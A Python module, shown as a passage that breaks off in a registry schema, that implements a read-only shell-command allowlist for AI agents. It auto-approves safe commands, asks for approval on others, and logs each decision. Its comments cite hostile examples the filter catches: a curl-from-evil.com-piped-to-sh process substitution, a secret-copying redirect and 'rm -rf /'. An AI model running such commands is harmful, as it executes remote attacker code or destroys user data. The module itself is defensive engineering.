"""Built-in read-only shell command allowlist (shell-surface).

A factory, :func:`allow_read_only_shell`, that recognizes a curated set of
side-effect-free shell commands (per-language/tool presets: core, git, node,
python, rust, docker, k8s, nix, terraform) and ALLOWs them outright, while
ASKing for everything else run through a shell tool. It exists to cut
approval fatigue for the read-only commands an agent runs constantly
(``git status``, ``cat``, ``pytest``, ``cargo check``, ``terraform plan``,
...) without opening the door to mutating or code-executing commands.

Ported from, and narrower than, xtga/agtx's ``permissions/*.toml`` presets:
that project treats "safe for the running phase" as "normal dev workflow"
and includes mutating commands (``git push``/``commit``/``merge``, ``npm
install``, ``cargo build``, ``docker build``/``run``, ``kubectl
apply``/``delete``, ``nixos-rebuild``, plus core utilities like ``rm``/
``mv``/``cp``/``mkdir``). This policy is deliberately narrower — only
commands that cannot mutate the filesystem, mutate the network, or spawn
arbitrary code are included by default. The ``terraform`` preset (covering
both the ``terraform`` and ``tofu`` CLIs) has no agtx equivalent — it was
added here directly. See ``data/shell_readonly_presets.yaml`` for the full
curated set and what was excluded (and why).

The command string is parsed with the same primitives as the other
shell-surface policies (:mod:`omnigent.policies.builtins._shell`): segments
are split on chaining operators, wrapper/env prefixes are stripped, and
shell-interpreter / ``eval`` wrappers are unwrapped and re-parsed
recursively — so the allowlist cannot be bypassed by chaining, wrapping, or
nesting. Output redirection (``>``, ``>>``, ``2>file``) and process
substitution (``<(...)``, ``>(...)``) disqualify a segment from the
allowlist even when the base command matches, since either can turn a
"read-only" command into a write or arbitrary-code execution — except for a
trailing redirect that provably writes nowhere (``> /dev/null``, ``2>&1``,
``&>/dev/null``, ...), which is still treated as read-only (see
``_has_unsafe_shell_syntax``).

**Interaction with ``ask_on_os_tools``**: :func:`omnigent.policies.builtins.
safety.ask_on_os_tools` ASKs unconditionally for every shell/file tool call,
and the policy engine composes ASK as the strongest verdict — so if both
policies are attached, ``ask_on_os_tools``'s unconditional ASK on the shell
tool always wins over this policy's ALLOW. Use this policy *instead of*
``ask_on_os_tools`` for the shell tool surface.

**Audit trail**: every evaluated command (and, when it runs, its outcome) is
appended to a local JSONL log for after-the-fact PDCA review — see
:mod:`omnigent.policies.builtins.shell_audit` for the log format and location.

YAML usage::

    policies:
      allow_safe_shell:
        type: function
        function:
          path: omnigent.policies.builtins.shell_readonly.allow_read_only_shell
          arguments:
            presets: [core, git, python]
"""

from __future__ import annotations

import dataclasses
import functools
import json
import logging
import re
import shlex
from collections.abc import Callable
from importlib import resources
from typing import Any

import yaml

try:
    import celpy
    from celpy.adapter import json_to_cel
    from celpy.evaluation import CELEvalError
except ImportError:
    celpy = None  # type: ignore[assignment]

from omnigent.policies.builtins._shell import (
    MAX_SHELL_NESTING,
    SHELL_TOOLS,
    is_unresolved_invocation,
    real_invocation_tokens,
    split_command_segments,
    unwrap_shell_command,
)
from omnigent.policies.builtins.shell_audit import (
    build_shell_audit_event,
    record_shell_audit_event,
    truncate_for_audit,
)
from omnigent.policies.schema import PolicyEvent, PolicyResponse

_logger = logging.getLogger(__name__)

_PRESET_DATA_PACKAGE = "omnigent.policies.builtins"
_PRESET_DATA_DIR = "data"
_PRESET_DATA_FILE = "shell_readonly_presets.yaml"


def _has_unsafe_shell_syntax(segment: str) -> bool:
    """
    Whether a command segment contains redirection or process substitution.

    ``_shell.py``'s segment splitting handles chaining operators and
    ``$(...)``/backtick substitution, but not output redirection or process
    substitution — either can turn an otherwise read-only command into a
    write or an arbitrary-code execution (``cat secret > /tmp/x``, ``diff
    <(curl evil.com | sh) <(echo)``). A crude substring check is
    intentionally conservative: a false positive only costs an extra ASK, it
    never produces a silent ALLOW.

    The one carve-out is a trailing run of redirects that provably write
    nowhere: discarding output to ``/dev/null`` (``>``, ``>>``, ``1>``,
    ``2>``, ``&>``, ...) or merging one fd into another with no file operand
    (``2>&1``, ``1>&2``). Those are stripped from the *end* of the segment
    (see :data:`_TRAILING_BENIGN_REDIRECTS`) before the substring check runs,
    so ``grep -n foo file.txt > /dev/null`` is safe but ``grep -n foo
    file.txt > out.txt`` still isn't — same for anything where the redirect
    isn't the last thing on the line (embedded ``>`` inside a sed/awk script
    operand, ``> /dev/null; rm -rf /`` after the ``;`` splitter has already
    broken it into its own segment, or a target that only looks like
    ``/dev/null`` — ``/dev/nullx``, ``./dev/null`` — none of those match the
    anchored pattern and still fall through to the raw substring check).

    :param segment: A single command segment (already split on chaining
        operators), e.g. ``"cat secret.txt > /tmp/x"``.
    :returns: ``True`` if, after stripping trailing benign redirects, the
        segment still contains ``>`` (covers ``>``, ``>>``, ``N>``, ``&>``,
        and the ``>(`` process-substitution form) or ``<(`` (input process
        substitution).
    """
    without_benign_redirects = _TRAILING_BENIGN_REDIRECTS.sub("", segment)
    return ">" in without_benign_redirects or "<(" in without_benign_redirects


# A single redirect clause that writes nowhere: stdout/stderr (optionally
# both, via `&>`) discarded to /dev/null, or one fd merged into another with
# no file operand at all (`2>&1`, `1>&2`). `[12]?` covers bare `>` (stdout),
# explicit `1>` (stdout), and `2>` (stderr); `{1,2}` covers both `>` and the
# append form `>>`.
_BENIGN_REDIRECT_CLAUSE = r"(?:&>{1,2}|[12]?>{1,2})\s*/dev/null|2>&1|1>&2"

# Matches one or more benign redirect clauses anchored to the END of the
# segment, each preceded by whitespace that separates it from the previous
# word. Anchoring to `$` is what rejects `/dev/nullx` (leftover `x` before
# the anchor breaks the match) and `./dev/null` (the literal `/dev/null`
# text doesn't start right after the operator's whitespace) without needing
# a manual lookahead/lookbehind. Requiring a `;`/`&&`/`|`-splitter to have
# already separated anything after the redirect means a smuggled command
# after it (`> /dev/null; rm -rf /`) never reaches this regex as part of the
# same segment in the first place.
_TRAILING_BENIGN_REDIRECTS = re.compile(rf"(?:\s+(?:{_BENIGN_REDIRECT_CLAUSE}))+\s*$")


# ── Full-argv CEL guards ─────────────────────────────────────────────────
#
# A plain prefix pattern (e.g. ``(git, status)``) is enough when every
# dangerous variant of a command differs in its FIRST tokens. That is false
# for ``find``, ``sed``, and ``awk``: their write/exec vectors
# (``-exec``/``-delete``, ``-i``/embedded ``w``·``e``, ``system()``/redirects)
# can appear anywhere in the argv, or inside a free-form script-text operand
# rather than as an isolated flag (see docs/shell-readonly-allowlist-audit.md
# §5–§6, which is why these three are excluded from a plain prefix pattern).
# A guarded pattern entry pairs a prefix with a CEL expression evaluated
# against the FULL real-invocation token list (`tokens`) and, for sed/awk,
# a small set of Python-computed derived facts (`facts`) that need real
# string parsing CEL isn't suited for (locating the script-text operand
# among flags, scanning it for embedded write/exec constructs). The
# expression must evaluate `true` for a DANGEROUS command — a `false` or any
# evaluation error (missing fact, bad expression, non-bool result) is treated
# as dangerous too, so an enumeration gap fails to ASK, never silently to
# ALLOW.
#
# Residual risk (documented, not eliminated — see the PR's Coverage notes):
#   - The predicate/flag lists below are enumerations, like every allowlist
#     in this module; a variant not enumerated is a gap until it's added.
#   - Shell expansion ($(...), $VAR, backticks) inside an argument can change
#     what a command does at runtime without changing its literal tokens;
#     command substitutions are recursively gated (see _shell.py), but a
#     plain variable expansion is not.
#   - The sed/awk script-text scans are regex heuristics over an opaque
#     string, not a real parser for either language; they favor false
#     positives (extra ASK) over false negatives by design, per the
#     ambiguous-must-ASK rule above, but are not exhaustive.


def _find_is_dangerous_facts(tokens: list[str]) -> dict[str, bool]:
    """
    No derived facts needed for ``find`` — its guard checks ``tokens`` (the
    predicate list) directly. Present for interface symmetry with the
    sed/awk extractors and so a guard can always reference ``facts`` without
    a ``KeyError``.

    :param tokens: Real-invocation tokens of the segment (unused).
    :returns: An empty mapping.
    """
    del tokens
    return {}


_SED_SCRIPT_FLAGS = frozenset({"-e", "--expression"})
_SED_FILE_FLAGS = frozenset({"-f", "--file"})

# Trailing s///-command flags that turn a substitution into a write (``w``)
# or an arbitrary shell execution of its output (``e``) — GNU sed extensions
# whose vector lives inside the script text's own delimiter-quoted syntax,
# not an isolated CLI flag. Matches the flag immediately after a same-line
# s-command delimiter (with other flags such as g/i/p optionally between);
# a delimiter that spans a newline is a known residual gap.
_SED_TRAILING_WRITE_RE = re.compile(r"[/|#,~!@:^][a-zA-Z]*w[a-zA-Z]*\s+\S")
_SED_TRAILING_EXEC_RE = re.compile(r"[/|#,~!@:^][a-zA-Z]*e[a-zA-Z]*(?:;|$)", re.MULTILINE)
# A standalone address-command form of the same two vectors:
# ``[addr[,addr]] w file`` and GNU sed's ``[addr] e [command]``.
_SED_ADDR_WRITE_RE = re.compile(r"(?:^|[;\n{])\s*[0-9,$]*\s*[wW]\s+\S")
_SED_ADDR_EXEC_RE = re.compile(r"(?:^|[;\n{])\s*[0-9,$]*\s*e(?:\s|;|$)", re.MULTILINE)


def _sed_script_operands(tokens: list[str]) -> tuple[list[str], bool]:
    """
    Best-effort extraction of ``sed``'s inline script-text operand(s).

    Handles the common forms: a single inline script as the first non-flag
    positional, or one or more ``-e``/``--expression`` scripts (GNU sed joins
    multiple ``-e`` scripts with a newline before running them, so callers do
    the same). A script supplied via ``-f``/``--file`` points at a file this
    function cannot read, so its content can't be scanned — that is reported
    separately as *has_external_script* rather than guessed at.

    :param tokens: Real-invocation tokens with the leading ``sed`` dropped.
    :returns: ``(script_texts, has_external_script)``.
    """
    args = tokens[1:]
    has_external = any(tok in _SED_FILE_FLAGS or tok.startswith("--file=") for tok in args)
    scripts: list[str] = []
    seen_script_source = False
    i = 0
    while i < len(args):
        tok = args[i]
        if tok in _SED_SCRIPT_FLAGS:
            seen_script_source = True
            if i + 1 < len(args):
                scripts.append(args[i + 1])
                i += 2
                continue
        elif tok.startswith("--expression="):
            seen_script_source = True
            scripts.append(tok.split("=", 1)[1])
        elif tok.startswith("-e") and len(tok) > 2:
            seen_script_source = True
            scripts.append(tok[2:])
        elif tok in _SED_FILE_FLAGS:
            # The value is a script FILE this function cannot read, not a
            # positional to scan — skip both the flag and its value.
            seen_script_source = True
            i += 1
        elif tok.startswith("--file="):
            seen_script_source = True
        elif not seen_script_source and not tok.startswith("-") and not scripts:
            # The first bare positional is the inline script only when no
            # -e/-f has claimed that role — subsequent positionals are
            # filenames sed operates on, not more script text.
            scripts.append(tok)
            seen_script_source = True
        i += 1
    return scripts, has_external


def _sed_facts(tokens: list[str]) -> dict[str, bool]:
    """
    Derived facts for the ``sed`` guard: in-place editing and script-text
    write/execute constructs.

    :param tokens: Real-invocation tokens, e.g. ``["sed", "-i", "s/a/b/", "f"]``.
    :returns: Mapping with ``has_inplace``, ``has_external_script``,
        ``has_write_command``, and ``has_execute_flag`` booleans.
    """
    args = tokens[1:]
    has_inplace = any(
        tok == "--in-place"
        or tok.startswith("--in-place=")
        or (tok.startswith("-") and not tok.startswith("--") and "i" in tok[1:])
        for tok in args
    )
    scripts, has_external = _sed_script_operands(tokens)
    blob = "\n".join(scripts)
    has_write = bool(_SED_TRAILING_WRITE_RE.search(blob) or _SED_ADDR_WRITE_RE.search(blob))
    has_exec = bool(_SED_TRAILING_EXEC_RE.search(blob) or _SED_ADDR_EXEC_RE.search(blob))
    return {
        "has_inplace": has_inplace,
        "has_external_script": has_external,
        "has_write_command": has_write,
        "has_execute_flag": has_exec,
    }


_AWK_SEP_VALUE_FLAGS = frozenset({"-F", "--field-separator"})
_AWK_ASSIGN_VALUE_FLAGS = frozenset({"-v", "--assign"})
_AWK_FILE_VALUE_FLAGS = frozenset({"-f", "--file"})


def _awk_script_operand(tokens: list[str]) -> tuple[str | None, bool]:
    """
    Best-effort extraction of ``awk``'s program-text operand.

    Walks the argv skipping flags known to take a value (``-F``/``-v`` in
    either the separate-token or attached form, ``-f``/``--file``) to reach
    the first bare positional, which is the program text in the common
    ``awk 'PROGRAM' file...`` / ``awk -F: 'PROGRAM' file`` forms. A program
    supplied via ``-f``/``--file`` points at a file this function cannot
    read — reported as *has_external_script* rather than guessed at. An
    unrecognized flag is skipped conservatively (as a valueless flag) rather
    than guessed to take a value, so it doesn't swallow the real program text.

    :param tokens: Real-invocation tokens with the leading ``awk`` dropped.
    :returns: ``(script_text, has_external_script)`` — *script_text* is
        ``None`` when no bare positional was found before a ``-f``/``--file``
        (i.e. the only program source is an external file).
    """
    args = tokens[1:]
    i = 0
    while i < len(args):
        tok = args[i]
        if tok in _AWK_FILE_VALUE_FLAGS or tok.startswith("--file="):
            # The program comes entirely from a file this function cannot
            # read; any remaining positionals are input files, not more
            # program text, so there is nothing further to scan.
            return None, True
        if tok in _AWK_SEP_VALUE_FLAGS or tok in _AWK_ASSIGN_VALUE_FLAGS:
            i += 2
            continue
        if tok.startswith(("--field-separator=", "--assign=")):
            i += 1
            continue
        if tok.startswith(("-F", "-v")) and len(tok) > 2:
            i += 1
            continue
        if tok == "-i":
            # gawk's extension loader (``-i inplace``) — the extension name
            # is not the program text; the inplace-editing check itself
            # reads the flag directly, independent of this walk.
            i += 2
            continue
        if tok.startswith("-"):
            i += 1
            continue
        return tok, False
    return None, False


def _awk_facts(tokens: list[str]) -> dict[str, bool]:
    """
    Derived facts for the ``awk`` guard: in-place editing, an external
    script file, and program-text write-redirection / ``system()`` calls.

    A bare ``>``/``>>`` inside the program text is flagged even though awk
    also uses ``>`` as a numeric/string comparison operator — the two are
    not distinguishable without a real awk parser, and per the
    ambiguous-must-ASK rule this module never guesses that a ``>`` is "just"
    a comparison. In practice ``has_redirect`` is redundant with — not the
    only thing catching — that case today: ``_has_unsafe_shell_syntax``
    already rejects ANY segment containing a literal ``>`` before a guard is
    ever evaluated, including one inside this script text's quotes. It is
    computed here anyway so the guard is correct standalone (and directly
    unit-tested as such), independent of that coarser, whole-segment check.

    :param tokens: Real-invocation tokens, e.g. ``["awk", "{print $1}"]``.
    :returns: Mapping with ``has_inplace``, ``has_external_script``,
        ``has_redirect``, and ``has_system_call`` booleans.
    """
    has_inplace = any(tok == "-i" for tok in tokens[1:])
    script, has_external = _awk_script_operand(tokens)
    if script is None:
        return {
            "has_inplace": has_inplace,
            "has_external_script": True,
            "has_redirect": False,
            "has_system_call": False,
        }
    return {
        "has_inplace": has_inplace,
        "has_external_script": has_external,
        "has_redirect": ">" in script,
        "has_system_call": "system(" in script or "system (" in script,
    }


_GUARD_FACT_EXTRACTORS: dict[str, Callable[[list[str]], dict[str, bool]]] = {
    "find": _find_is_dangerous_facts,
    "sed": _sed_facts,
    "awk": _awk_facts,
}


def _compile_guard(
    expression: str,
    facts_fn: Callable[[list[str]], dict[str, bool]],
) -> Callable[[list[str]], bool]:
    """
    Compile a pattern entry's CEL guard expression into a callable.

    :param expression: CEL expression over ``tokens`` (the segment's full
        real-invocation token list) and ``facts`` (the base command's
        derived-fact mapping). Must evaluate to a bool; ``true`` means the
        command is DANGEROUS (the pattern does not grant ALLOW).
    :param facts_fn: The base command's fact extractor
        (:data:`_GUARD_FACT_EXTRACTORS`).
    :returns: A callable ``(tokens) -> bool`` — ``True`` when dangerous.
    :raises ImportError: If ``cel-python`` is not installed.
    :raises ValueError: If *expression* has a CEL syntax error.
    """
    if celpy is None:
        raise ImportError(
            "cel-python is required for guarded shell_readonly patterns but is not installed."
        )
    env = celpy.Environment()
    prog = env.program(env.compile(expression))

    def _guard(tokens: list[str]) -> bool:
        try:
            result = prog.evaluate(
                {
                    "tokens": json_to_cel(list(tokens)),
                    "facts": json_to_cel(facts_fn(tokens)),
                }
            )
        except (CELEvalError, ValueError, TypeError):
            # An expression that can't evaluate against this argv (missing
            # fact, unexpected shape) is exactly the "ambiguous" case the
            # guard exists to fail closed on.
            return True
        return bool(result)

    return _guard


@dataclasses.dataclass(frozen=True)
class _PatternRule:
    """
    One allowlist pattern: a literal token prefix plus an optional guard.

    :ivar tokens: The prefix pattern, e.g. ``("git", "status")``.
    :ivar guard: When set, a compiled CEL guard (:func:`_compile_guard`) that
        must return ``False`` (not dangerous) for a prefix match to count as
        safe. ``None`` means the prefix alone is sufficient, as for every
        plain (unguarded) preset entry.
    """

    tokens: tuple[str, ...]
    guard: Callable[[list[str]], bool] | None = None


@functools.lru_cache(maxsize=1)
def _preset_data() -> dict[str, Any]:  # type: ignore[explicit-any]
    """
    Load and cache the raw bundled preset YAML.

    :returns: Parsed YAML mapping of preset name to
        ``{"description": str, "commands": list[list[str]]}``.
    """
    path = resources.files(_PRESET_DATA_PACKAGE).joinpath(_PRESET_DATA_DIR, _PRESET_DATA_FILE)
    return yaml.safe_load(path.read_text()) or {}


@functools.lru_cache(maxsize=1)
def _load_presets() -> dict[str, list[_PatternRule]]:
    """
    Load the bundled read-only command presets as matchable pattern rules.

    A preset's ``commands`` entries are either a plain list of literal
    tokens (``[git, status]`` — the prefix alone is sufficient) or a mapping
    with ``pattern`` and ``guard`` keys (``{pattern: [find], guard: "..."}``
    — see :data:`_GUARD_FACT_EXTRACTORS`), whose CEL guard is compiled once
    here and cached for the process lifetime.

    :returns: Mapping of preset name (``"core"``, ``"git"``, ...) to a list
        of :class:`_PatternRule`.
    """
    presets: dict[str, list[_PatternRule]] = {}
    for name, entry in _preset_data().items():
        commands = entry.get("commands", []) if isinstance(entry, dict) else []
        rules: list[_PatternRule] = []
        for cmd in commands:
            if not cmd:
                continue
            if isinstance(cmd, dict):
                pattern = tuple(cmd["pattern"])
                guard_expr = cmd.get("guard")
                guard = (
                    _compile_guard(guard_expr, _GUARD_FACT_EXTRACTORS[pattern[0]])
                    if guard_expr
                    else None
                )
                rules.append(_PatternRule(pattern, guard))
            else:
                rules.append(_PatternRule(tuple(cmd)))
        presets[name] = rules
    return presets


def list_read_only_presets() -> dict[str, str]:
    """
    List the bundled preset names and their descriptions.

    For callers (UI, docs) that want to show available presets without
    hardcoding the set.

    :returns: Mapping of preset name to its human-readable description.
    """
    return {
        name: (entry.get("description", "") if isinstance(entry, dict) else "")
        for name, entry in _preset_data().items()
    }


_WILDCARD_TOKEN = "*"


def _matches_pattern(tokens: list[str], pattern: tuple[str, ...]) -> bool:
    """
    Whether real-invocation *tokens* start with *pattern*.

    The first token is compared by basename so an absolute-path invocation
    (``/usr/bin/git status``) matches like the bare word. Remaining pattern
    tokens are compared literally against the following tokens (subcommand
    words), so ``("git", "status")`` matches ``["git", "status", "-s"]`` but
    not ``["git", "stash"]`` — except a pattern token that is exactly
    ``"*"``, which matches any single token in that position. This is for
    an argument whose *value* doesn't change the command's safety, only
    where it targets — e.g. ``("git", "-C", "*", "status")`` matches
    ``git -C <any path> status`` without pinning a literal path, since
    ``git status`` is read-only no matter which repo it targets. Only ever
    put a wildcard where every possible value is equally safe: a wildcard
    in the subcommand position itself would allow-list far more than
    intended.

    :param tokens: Real-invocation tokens of one segment, e.g.
        ``["git", "status", "-s"]``.
    :param pattern: A command pattern from a preset, e.g.
        ``("git", "status")`` or ``("git", "-C", "*", "status")``.
    :returns: ``True`` if *tokens* starts with *pattern*.
    """
    if len(tokens) < len(pattern):
        return False
    head = tokens[0].rsplit("/", 1)[-1]
    if pattern[0] != _WILDCARD_TOKEN and head != pattern[0]:
        return False
    return all(
        pat_tok in (_WILDCARD_TOKEN, tok)
        for pat_tok, tok in zip(pattern[1:], tokens[1 : len(pattern)], strict=True)
    )


# ── Audit-trail helpers ─────────────────────────────────────────────────
#
# Small, dependency-free helpers used by the ``_audit_decision`` /
# ``_audit_execution`` closures inside :func:`allow_read_only_shell`. Kept
# as free functions (rather than nested) since none of them close over the
# factory's ``patterns`` / ``shell_tool_names`` state.


def _audit_session_id() -> str | None:
    """Best-effort session id for an audit record.

    :class:`~omnigent.policies.schema.PolicyEvent` carries no
    conversation/session id (see
    :class:`~omnigent.policies.schema.EventContext`), so this reads it out of
    band: the server's request-scoped ContextVar
    (:func:`omnigent.debug_logging.current_session_id`, bound per request by
    the HTTP middleware) first, then the runner's process-wide primary
    session (:func:`omnigent.debug_logging.runner_primary_session_id`,
    set once at spawn — mis-attributes a sub-agent turn to its parent, the
    same known limitation the debug-log sink documents).

    :returns: A session id, or ``None`` when neither source applies.
    """
    from omnigent.debug_logging import current_session_id, runner_primary_session_id

    return current_session_id() or runner_primary_session_id()


def _audit_user_id(event: PolicyEvent) -> str | None:
    """Best-effort identity of the session owner for an audit record.

    Prefers the process-local authenticated user
    (:func:`omnigent.debug_logging.current_user_id`, set on the runner and
    the multi-tenant server), falling back to the event's
    ``context.actor.run_as`` (populated server-side per request).

    :param event: The policy event carrying ``context.actor``.
    :returns: A user identifier (typically an email), or ``None`` when
        neither source is available.
    """
    from omnigent.debug_logging import current_user_id

    user_id = current_user_id()
    if user_id:
        return user_id
    context = event.get("context")
    actor = context.get("actor") if isinstance(context, dict) else None
    run_as = actor.get("run_as") if isinstance(actor, dict) else None
    return run_as or None


def _request_data_command(request_data: object) -> str | None:
    """Pull the original shell command out of a ``tool_result``'s ``request_data``.

    :param request_data: ``event["request_data"]`` — the originating
        ``{"name", "arguments"}`` tool-call payload the server threads onto
        the ``tool_result`` event (absent on the runner-side gate; see
        ``_audit_execution``'s docstring).
    :returns: The command string, or ``None`` when unavailable.
    """
    if not isinstance(request_data, dict):
        return None
    arguments = request_data.get("arguments")
    if not isinstance(arguments, dict):
        return None
    command = arguments.get("command")
    return command if isinstance(command, str) and command.strip() else None


def _parse_tool_result_data(data: object) -> tuple[int | None, str | None, str | None]:
    """Best-effort ``(exit_code, stdout_preview, stderr_preview)`` from a tool_result payload.

    ``data`` is either the tool's raw output string (runner-side gate) or
    ``{"result": <output>}`` (server-side engine — see
    ``omnigent.server.routes._sessions.orchestration``'s TOOL_RESULT
    dispatch). ``<output>`` is the shell tool's text output — for
    ``sys_os_shell`` a JSON-encoded ``{"stdout", "stderr", "exit_code", ...}``
    blob; native shell tools (``Bash``, ``Shell``, ...) return plain text with
    no structured exit code. A non-JSON output still yields a stdout preview
    of the raw text, so the audit trail shows *that* the command ran even
    without a breakdown.

    :param data: ``event["data"]`` at the ``tool_result`` phase.
    :returns: ``(exit_code, stdout_preview, stderr_preview)``, each ``None``
        when not recoverable.
    """
    output = data.get("result") if isinstance(data, dict) else data
    if isinstance(output, str):
        try:
            parsed = json.loads(output)
        except (json.JSONDecodeError, ValueError):
            return None, truncate_for_audit(output), None
    elif isinstance(output, dict):
        parsed = output
    else:
        return None, None, None
    if not isinstance(parsed, dict):
        return None, None, None
    exit_code = parsed.get("exit_code")
    exit_code = exit_code if isinstance(exit_code, int) else None
    stdout = parsed.get("stdout")
    stderr = parsed.get("stderr")
    return (
        exit_code,
        truncate_for_audit(stdout) if isinstance(stdout, str) else None,
        truncate_for_audit(stderr) if isinstance(stderr, str) else None,
    )


def allow_read_only_shell(
    presets: list[str] | None = None,
    extra_allow: list[list[str]] | None = None,
    shell_tools: list[str] | None = None,
) -> Callable[[PolicyEvent], PolicyResponse | None]:
    """
    Build a policy callable that auto-allows a curated read-only command set.

    :param presets: Names of bundled presets to enable, e.g.
        ``["core", "git", "python"]``. Defaults to ``["core"]`` when omitted
        or empty. Unknown names are ignored (no error — a caller can pass a
        preset list without checking it against the current bundle).
    :param extra_allow: Additional command patterns beyond the bundled
        presets, each a list of literal tokens, e.g. ``[["make", "test"]]``.
        Merged with the selected presets' patterns.
    :param shell_tools: Names of the shell tools whose ``command`` argument
        is parsed. ``None`` uses every harness's shell tool
        (:data:`~omnigent.policies.builtins._shell.SHELL_TOOLS`).
    :returns: A one-argument policy callable. Returns ``{"result": "ALLOW"}``
        when every segment of the command matches an enabled pattern,
        ``{"result": "ASK", "reason": ...}`` otherwise, or ``None`` (abstain)
        for non-shell-tool events.
    """
    all_presets = _load_presets()
    selected_names = presets if presets else ["core"]
    patterns: list[_PatternRule] = []
    for name in selected_names:
        patterns.extend(all_presets.get(name, []))
    for extra in extra_allow or []:
        patterns.append(_PatternRule(tuple(extra)))

    shell_tool_names = (
        frozenset(shell_tools) if shell_tools is not None else frozenset(SHELL_TOOLS)
    )

    def _segment_is_safe(segment: str, _depth: int = 0) -> bool:
        """
        Whether one command segment matches the enabled allowlist.

        Recursively unwraps shell-interpreter / ``eval`` wrappers so ``bash
        -c "git push"`` is judged like a bare ``git push`` rather than
        slipping past as an opaque ``bash -c`` invocation.

        :param segment: A single command segment.
        :param _depth: Internal recursion guard; callers leave it 0.
        :returns: ``True`` if the segment is safe to auto-allow.
        """
        if _depth > MAX_SHELL_NESTING:
            return False
        if _has_unsafe_shell_syntax(segment):
            return False
        try:
            tokens = shlex.split(segment)
        except ValueError:
            return False
        tokens = real_invocation_tokens(tokens)
        if not tokens or is_unresolved_invocation(tokens):
            return False
        inner = unwrap_shell_command(tokens)
        if inner is not None:
            return _segment_is_safe(inner, _depth + 1)
        for rule in patterns:
            if not _matches_pattern(tokens, rule.tokens):
                continue
            if rule.guard is None or not rule.guard(tokens):
                return True
            # Prefix matched but the guard flagged this invocation as
            # dangerous (e.g. `find ... -exec`) — keep checking in case a
            # different rule also matches and isn't guarded.
        return False

    def _evaluate_command(command: str) -> PolicyResponse:
        """
        Evaluate a full shell command string against the allowlist.

        :param command: The shell command string, e.g. ``"git status && ls"``.
        :returns: ``{"result": "ALLOW"}`` when every segment is safe,
            otherwise ``{"result": "ASK", "reason": ...}`` naming the first
            segment that isn't covered.
        """
        for segment in split_command_segments(command):
            if not _segment_is_safe(segment):
                return {
                    "result": "ASK",
                    "reason": f"Agent wants to run {segment[:80]!r}, which is not on the "
                    f"read-only allowlist. Approve?",
                }
        return {"result": "ALLOW"}

    def _audit_decision(
        command: str,
        tool: str,
        response: PolicyResponse,
        event: PolicyEvent,
    ) -> None:
        """Append a ``"decision"`` audit row for one evaluated command.

        Never raises — a broken audit sink must not turn into a denied
        shell command (see :mod:`shell_audit`'s module docstring).

        :param command: The full command string that was evaluated.
        :param tool: The shell tool name the command was submitted through.
        :param response: This policy's own verdict for *command*.
        :param event: The originating ``tool_call`` event, for identity.
        """
        try:
            decision = "auto_approved" if response.get("result") == "ALLOW" else "blocked"
            record_shell_audit_event(
                build_shell_audit_event(
                    stage="decision",
                    decision=decision,
                    tool=tool,
                    command=truncate_for_audit(command),
                    reason=response.get("reason"),
                    session_id=_audit_session_id(),
                    user_id=_audit_user_id(event),
                )
            )
        except Exception:  # noqa: BLE001 — audit failures must never deny a command
            _logger.warning("shell command decision audit failed", exc_info=True)

    def _audit_execution(event: PolicyEvent) -> None:
        """Append an ``"execution"`` audit row when a shell tool_result lands.

        Only fires when the original command is recoverable from
        ``event["request_data"]`` — present on the server-side engine's
        TOOL_RESULT dispatch, absent on the runner-side gate (see
        :class:`omnigent.runner.policy.RunnerToolPolicyGate`), which is a
        known coverage gap for locally-run sessions. Silently no-ops when
        the command can't be recovered rather than logging a row with no
        useful correlation.

        :param event: The ``tool_result`` policy event.
        """
        try:
            command = _request_data_command(event.get("request_data"))
            if command is None:
                return
            verdict = _evaluate_command(command)
            decision = "auto_approved" if verdict.get("result") == "ALLOW" else "manually_approved"
            exit_code, stdout_preview, stderr_preview = _parse_tool_result_data(event.get("data"))
            record_shell_audit_event(
                build_shell_audit_event(
                    stage="execution",
                    decision=decision,
                    tool=event.get("target") or "",
                    command=truncate_for_audit(command),
                    session_id=_audit_session_id(),
                    user_id=_audit_user_id(event),
                    exit_code=exit_code,
                    stdout_preview=stdout_preview,
                    stderr_preview=stderr_preview,
                )
            )
        except Exception:  # noqa: BLE001 — audit failures must never deny a command
            _logger.warning("shell command execution audit failed", exc_info=True)

    def _evaluate(event: PolicyEvent) -> PolicyResponse | None:
        """
        Evaluate one policy event against the read-only shell allowlist.

        Decides on ``tool_call`` events for the configured shell tools only;
        abstains on everything else so the policy composes with others
        (e.g. a separate approval gate for Read/Write/Edit tools). Every
        evaluated ``tool_call`` and every observed shell ``tool_result`` is
        also appended to the local audit log (:mod:`shell_audit`) so the
        allowlist can be reviewed after the fact — see that module's
        docstring for the PDCA use case. Auditing is a side effect only:
        ``tool_result`` handling always returns ``None`` (abstain), never
        gating or transforming the result.

        :param event: The policy event.
        :returns: A :class:`PolicyResponse`, or ``None`` to abstain.
        """
        event_type = event.get("type")
        if event_type == "tool_result":
            tool = event.get("target")
            if isinstance(tool, str) and tool in shell_tool_names:
                _audit_execution(event)
            return None
        if event_type != "tool_call":
            return None
        data = event.get("data")
        if not isinstance(data, dict):
            return None
        tool = data.get("name")
        if not isinstance(tool, str) or tool not in shell_tool_names:
            return None
        args = data.get("arguments")
        args = args if isinstance(args, dict) else {}
        command = args.get("command")
        if not isinstance(command, str) or not command.strip():
            return None
        response = _evaluate_command(command)
        _audit_decision(command, tool, response, event)
        return response

    return _evaluate


# ── Registry ─────────────────────────────────────────────────────────────────

POLICY_REGISTRY: list[dict[str, Any]] = [  # type: ignore[explicit-any]
    {
        "handler": "omnigent.policies.builtins.shell_readonly.allow_read_only_shell",
        "kind": "factory",
        "name": "Allow Read-Only Shell Commands",
        "description": (
            "Auto-ALLOWs a curated set of side-effect-free shell commands "
            "(per-language presets: core, git, node, python, rust, docker, "
            "k8s, nix, terraform) and ASKs for everything else run through "
            "a shell tool. Chained, wrapped (sudo/timeout/bash -c), and redirected "
            "commands are parsed so the allowlist cannot be bypassed. Use "
            "instead of 'Require Approval for File & Shell Operations' for "
            "the shell surface — attaching both means the shell always "
            "asks, since ASK always wins when policies disagree."
        ),
        "params_schema": {
            "type": "object",
            "properties": {
                "presets": {
                    "type": "array",
                    "items": {
                        "type": "string",
                        "enum": [
                            "core",
                            "git",
                            "node",
                            "python",
                            "rust",
                            "docker",
                            "k8s",
                            "nix",
                            "terraform",
                        ],
                    },
                    "description": "Bundled preset names to enable.",
                    "default": ["core"],
                },
                "extra_allow": {
                    "type": "array",
                    "items": {"type": "array", "items": {"type": "string"}},
                    "description": "Extra command patterns beyond the presets, "
                    'each a token list, e.g. [["make", "test"]]. A token that is '
                    'exactly "*" matches any single value at that position — use it '
                    "only where every possible value is equally safe, e.g. "
                    '[["git", "-C", "*", "status"]] for git status against any repo.',
                },
                "shell_tools": {
